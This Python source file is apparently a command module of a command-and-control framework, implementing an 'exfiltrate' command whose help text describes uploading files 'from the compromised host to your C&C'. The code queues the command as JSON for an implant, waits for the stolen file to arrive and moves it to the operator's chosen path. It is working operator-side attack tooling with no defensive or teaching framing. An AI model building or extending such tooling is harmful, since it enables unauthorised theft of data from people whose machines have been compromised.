from command import Command
from shutil import copyfile
from colorama import Fore
import os
import json
import random
import string
import time

class Exfiltrate(Command): 
	 		 
	def printHelp(self):

		helpstr = """\n Upload a file from the compromised host to your C&C.
	\n ** USAGE **: exfiltrate <file to upload> <destination path> 
		"""

		print(helpstr)

	def writeCommandInFile(self, command, prevId, nextId, filePath):
		if len(command) == 0:
			content = {}
			content['NextId'] = nextId
			content['NextAuth'] = ""
			content['Commands'] = command
			with open(filePath, 'w') as f:
				json.dump(content, f)
			return

		rand = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
		path = command[1]
		command[1] = rand
		command.insert(0,"exfiltrate")

		content = {}
		content['NextId'] = nextId
		content['NextAuth'] = ""
		content['Commands'] = command
		with open(filePath, 'w') as f:
			json.dump(content, f)
		
		cont = 0
		filePath = "..\\" + rand

		while (not os.path.isfile(filePath)) and (cont < 20) :
			time.sleep(0.5)
			cont += 1

		if not os.path.isfile(filePath):
			return
		
		try:	
			copyfile(filePath, path)
			os.remove(filePath)

		except:
			print(Fore.RED + "Directory not found. Your file is at " + filePath)



	def executeCommand(self, cmdSpl, prevId, nextId, filePath):

		if cmdSpl[0] == 'help':
			self.printHelp()
		else:
				
						
			#command = self.parseArgs(None, cmdSpl, None)
			self.writeCommandInFile(cmdSpl, prevId, nextId, filePath)
			#os.system(command) 
			return True
